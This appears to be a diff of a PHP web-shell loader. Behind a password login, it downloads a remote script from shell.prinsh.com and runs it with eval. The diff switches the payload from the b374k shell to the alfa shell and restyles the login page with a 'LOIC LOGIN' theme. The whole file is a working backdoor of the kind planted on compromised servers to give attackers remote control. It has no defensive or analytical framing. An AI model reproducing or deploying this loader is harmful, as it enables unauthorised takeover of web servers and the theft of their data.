@@ -1,3 +1,4 @@
+
 <?php
 session_start();
 
@@ -55,23 +56,67 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-  $a = geturlsinfo('https://shell.prinsh.com/Nathan/b374k.txt');
+  $a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
   eval('?>' . $a);
 } else {
   // Display login form if not logged in
   ?>
   <!DOCTYPE html>
-  <html>
-  <head>
-    <title>Login</title>
-  </head>
-  <body>
-    <form method="POST" action="">
-      <label for="password">Password:</label>
-      <input type="password" id="password" name="password">
-      <input type="submit" value="Login">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOGIN</title>
+    <style>
+        * {
+            padding: 0%;
+            margin: 0%;
+            box-sizing: border-box;
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+        }
+        .pas {
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            border: none;
+            justify-content: center;
+            align-items: center;
+            color: aqua;
+            background-color: transparent;
+            padding: 10px 10px;
+        }
+        .pas:hover{
+            border: 1px solid lavender;
+        }
+        .pas:active::after::content{
+            border: none;
+        }
+        body {
+            color: aquamarine;
+            background-color: black;
+        }
+        img {
+            border: none;
+            border-radius: 50%;
+            background: linear-gradient(to bottom, black, black,black,black,darkgray, darkgray);
+        }
+        .log {
+            background-color: transparent;
+            border: none;
+            padding: 10px 10px;
+            color: aqua;
+            font-size: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <form action="" method="post">
+            <img src="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" alt="demon">
+            <h1>LOIC LOGIN</h1>
+        <input type="password" name="password" id="password" placeholder="pass mu cok" class="pas">
+        <input type="submit" value=">" class="log">
     </form>
-  </body>
+    </center>
+</body>
 </html>
   <?php
 }
